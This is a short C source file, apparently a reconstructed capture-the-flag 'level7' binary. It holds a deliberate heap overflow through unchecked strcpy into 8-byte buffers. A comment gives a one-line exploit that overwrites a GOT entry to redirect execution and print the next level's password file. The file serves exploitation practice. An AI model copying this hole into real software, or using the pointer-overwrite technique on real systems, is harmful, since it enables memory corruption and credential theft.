#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[68];

struct node {
    int   type;
    char *data;
};

void m(void)
{
    printf("%s - %d\n", c, time(NULL));
}

// /home/user/level7/level7 $(python -c "import struct; print b'A' * 20 + struct.pack('<I', 0x8049928)") $'\xf4\x84\x04\x08'
int main(int argc, char **argv)
{
    struct node *c1;
    struct node *c2;
    FILE        *f;

    c1       = malloc(sizeof(struct node));
    c1->type = 1;
    c1->data = malloc(8);

    c2       = malloc(sizeof(struct node));
    c2->type = 2;
    c2->data = malloc(8);

    strcpy(c1->data, argv[1]);
    strcpy(c2->data, argv[2]);

    f = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, f);

    puts("~~");
    return 0;
}
